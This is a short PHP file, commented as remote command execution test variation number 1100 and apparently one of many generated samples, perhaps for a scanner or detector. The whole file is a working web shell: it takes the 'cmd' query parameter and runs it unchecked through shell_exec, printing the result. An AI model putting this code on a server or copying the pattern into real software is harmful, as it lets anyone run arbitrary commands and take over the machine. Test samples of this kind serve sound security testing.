<?php
// RCE test variation #1100
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>